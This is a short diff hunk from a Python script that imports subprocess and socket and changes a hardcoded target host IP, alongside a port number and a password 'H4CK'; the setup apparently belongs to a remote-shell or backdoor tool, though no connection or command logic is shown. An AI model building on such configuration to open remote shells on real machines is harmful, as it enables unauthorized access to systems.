@@ -2,7 +2,7 @@
 import subprocess
 import socket
 
-host = "10.19.252.139"
+host = "192.168.0.47"
 port = 12345
 passwd = "H4CK"
 
